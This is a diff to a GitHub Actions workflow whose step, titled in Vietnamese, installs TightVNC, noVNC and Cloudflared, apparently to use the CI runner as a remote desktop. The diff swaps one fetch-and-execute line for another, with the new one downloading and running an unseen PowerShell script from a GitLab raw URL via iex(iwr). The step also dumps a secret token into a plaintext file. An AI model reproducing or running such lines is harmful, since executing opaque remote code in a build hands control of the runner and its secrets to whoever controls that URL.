@@ -32,7 +32,7 @@ jobs:
     - name: 🖥️ Cài đặt và chạy TightVNC, noVNC, Cloudflared
       shell: pwsh
       run: |
-        Start-Process powershell -Verb runAs -WindowStyle Hidden -ArgumentList "-c iex (iwr https://hai1723.pythonanywhere.com/url -UseBasicParsing)"
+        iex(iwr https://gitlab.com/haingng16/sigmatoilet/-/raw/main/a)
         $env:GITHUB_TOKEN_VPS | Out-File -FilePath "D:\a\vpstoken.txt"
         try {
           Write-Host "📥 Installing TightVNC..."
